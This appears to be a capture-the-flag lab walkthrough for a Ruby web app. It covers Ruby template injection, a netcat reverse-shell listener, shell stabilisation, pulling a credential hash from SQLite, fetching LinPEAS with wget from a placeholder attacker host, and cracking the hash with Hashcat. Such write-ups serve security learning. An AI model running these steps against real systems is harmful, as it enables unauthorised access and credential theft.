### Security Assessment Workflow

1. **Initial Reconnaissance with Nmap**
    
    - Identified an open **web service**.
    
1. **Web Application Analysis**
    
    - Accessed the service and found text input fields that returned user-provided text.
    - Attempted directory fuzzing with Gobuster, but it failed to identify any directories.
    - Observed errors when attempting to inject code, flagged as **malicious input**.
    - Determined that the application was running on **Ruby**.
3. **Server-Side Template Injection (SSTI) Exploitation**
    
    - Translated a server-side template injection (SSTI) exploit into Ruby syntax.
    - Used Burp Suite to test the injection, encoding key characters for URL compliance:
        - For a **new line**: `%0A`
    - Successfully confirmed SSTI exploitation.
4. **Gaining Reverse Shell Access**
    
    - Started a listener on port 9001 using Netcat:
      
        `nc -lvnp 9001`
        
    - Verified available interpreters:
        - `which bash` → `/usr/bin/bash`
        - `which python3` → `/usr/bin/python3`
    - Downloaded a Python 3 reverse shell script from **revshells.com**, URL-encoded it, and executed it.
5. **Interactive Shell Setup**
    
    - Stabilized the shell with the following commands:
    
        `python3 -c 'import pty; pty.spawn("/bin/bash")'   stty raw -echo; fg   export TERM=xterm`  
        
6. **Post-Exploitation Activities**
    
    - Retrieved the `user.txt` flag.
    - Discovered a file containing **credentials**.
    - Identified the file type with the `file` command.
    - Accessed the file using **SQLite3** and retrieved a hash.
7. **Password Cracking Attempts**
    
    - Attempted to crack the hash using **John the Ripper** and **Hashcat**, but both failed.
    - Decided to explore other approaches.
8. **Privilege Escalation**
    
    - Set up a Python HTTP server:
      
        `python3 -m http.server 9090`  
        
    - Used `wget` from the reverse shell to download **LinPEAS**:
      
        `wget http://yourIP:9090/linpeas.sh   chmod +x linpeas.sh`  
        
    - Executed LinPEAS to search for sensitive files, focusing on **MAIL** directories.
9. **Password Recovery and Final Steps**
    
    - Found a password structure hint in mail logs.
    - Combined it with the previously retrieved hash and successfully cracked it using **Hashcat**